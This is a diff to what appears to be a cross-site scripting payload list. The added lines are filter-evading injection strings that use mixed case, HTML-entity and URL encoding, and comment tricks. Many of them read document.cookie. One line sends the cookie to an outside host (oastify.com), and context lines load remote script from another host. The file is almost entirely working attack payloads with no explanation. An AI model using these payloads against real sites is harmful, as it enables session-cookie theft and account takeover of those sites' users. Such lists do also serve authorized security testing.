@@ -1,4 +1,7 @@
 '"><A HRef=\" AutoFocus OnFocus=top/**/?. >
+'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
+%27"><Img Src=OnXSS OnError=alert(1)>
 %27"><A%20HRef=\"%20AutoFocus%20OnFocus=top/**/?. >
 %27/onerror=alert(1)/%27
 /confirm?.(1)/
@@ -11,6 +14,8 @@
 <!-- --!><script>alert(1)</script>
 <script><!--\uFEFF--></script><script>alert(%27BOM%20Injection%27)</script>
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+1%27%22%3E%3CImg+Src%3DOnXSS+OnError%3Dalert%28document.cookie%29%3E
+1%27"><Img+Src%3DOnXSS+OnError%3Dalert%28document.cookie%29>
 <img//////src=x oNlY=1 oNerror=alert('xxs')//
 </img+src=x%20oNlY=1%20oNerror=alert(document.cookie)>//
 <img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`//>
@@ -38,3 +43,42 @@ confirm?.(1)
 1'"<�!--�><�Img/Src/On�Error=(conf�irm)(1)>
 <img//////src=x oNlY=1 oNerror=alert(document.cookie)(import(/https:\\X55.is?1=18369/.source))//>
 '/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=alert(1)/**/(import(/https:\\X55.is?1=18369/.source))//>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<img src=x onerror=this.src='http://oastify.com?c='+document.cookie>
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+<img src='1' onerror='alert(0)' <
+`<svg onload='1`'alert(0)'`
+%3cscript+%2f*%2500*%2f%3e%2f*%2500*%2falert(1)%2f*%2500*%2f%3c%2fscript+%2f*%2500*%2f
+"><body/oNpagEshoW=(confirm)(document.domain)>
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
+%27%22%3E%3CImg%20Src=OnXSS%20OnError=alert(1)%3E
+")%27--><SvG/oNlOaD=(confirm)(1)<!--"
+")%27--><Svg/oNloAd=(co&#x6e;firm)(1)<!--"
+")%27--><sVG/oNLoaD=(c&#111;nfirm)(1)<!--"
+")%27--><SvG/oNloAd=(&#99;onfirm)(1)<!--"
+")%27--><SvG/onLoAD=(con&#x66;irm)(1)<!--"
+")%27--><SvG/onLoAD=(&#99;onfirm)(1)<!--"
+")%27--><sVg/onload=(confirm)(1)--!>"
+")%27--><sVG/onLoad=(confi&#114;m)(1)<!--"
+")%27--><sVG/onLoad=(conf&#105;rm)(1)<!--"
+")%27--><SvG/onLoad=(confirm)(1)<!--"
+")%27--><sVG/onLoad=(confi&#x72;m)(1)<!--"
+")%27--><sVG/onload=(co&#110;firm)(1)<!--"
+")%27--><sVG/onLoaD=(confirm)(1)--!>"
+")%27--><sVG/onLoaD=(co&#110;firm)(1)<!--"
+")%27--><sVG/onLoaD=(conf&#105;rm)(1)<!--"
+")%27--><SvG/onload=(co&#110;firm)(1)<!--"
+")%27--><SvG/onload=(co&#110;firm)(1)--!>"
+")%27--><SvG/onLoad=(confirm)(1)--!>"
+")%27--><sVG/onLoad=(confirm)(1)--!>"
+")%27--><SvG/onLoAd=(confirm)(1)<!--"
+")%27--><sVG/onLoaD=(conf&#105;rm)(1)<!--"
+")%27--><sVG/onLoaD=(confi&#x72;m)(1)<!--"
+")%27--><sVG/onLoad=(confirm)(1)--!>"
+")%27--><SvG/onLoad=(conf&#105;rm)(1)--!>"
+")%27--><SvG/onLoaD=(co&#110;firm)(1)<!--"
+")%27--><sVG/onload=(conf&#105;rm)(1)<!--"
+")%27--><sVG/onload=(conf&#105;rm)(1)--!>"
+")%27--><SvG/onLoaD=(co&#110;firm)(1)--!>"
+")%27--><SvG/onLoad=(confirm)(1)--!>"
+")%27--><sVG/onload=(co&#110;firm)(1)<!--"
